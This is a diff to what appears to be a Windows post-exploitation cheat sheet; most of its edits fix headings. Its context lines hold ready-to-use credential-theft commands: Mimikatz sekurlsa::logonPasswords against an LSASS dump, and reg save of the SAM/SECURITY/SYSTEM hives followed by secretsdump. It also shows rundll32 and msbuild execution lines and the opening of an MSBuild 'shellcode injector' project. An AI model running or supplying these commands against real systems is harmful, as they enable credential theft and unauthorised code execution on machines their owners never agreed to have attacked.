@@ -455,7 +455,7 @@ dir C:\Users\Public\lsass.dmp
 Invoke-Mimikatz -Command '"sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords"'
 ```
 
-#### Rex.exe dumping sam
+#### Reg.exe dumping sam
 ```
 reg save HKLM\SECURITY security.bak
 reg save HKLM\SYSTEM system.bak
@@ -470,9 +470,13 @@ secretsdump.py -sam sam.bak -security security.bak -system system.bak local
 C:\Windows\System32\rundll32.exe <FILE>.dll,StartW
 ```
 
-#### Msbuilt.exe
+### Msbuilt.exe
 - Can be used to execute arbitrary C# code from a `.csproj` or `.xml` file.
-- Example shellcode injector
+```
+msbuild.exe <FILE>
+```
+
+#### Example shellcode injector
 ```
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
   <Target Name="MSBuild">
@@ -543,7 +547,7 @@ C:\Windows\System32\rundll32.exe <FILE>.dll,StartW
 </Project>
 ```
 
-- Example PowerShell clm
+#### Example PowerShell clm
 ```
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
   <Target Name="MSBuild">
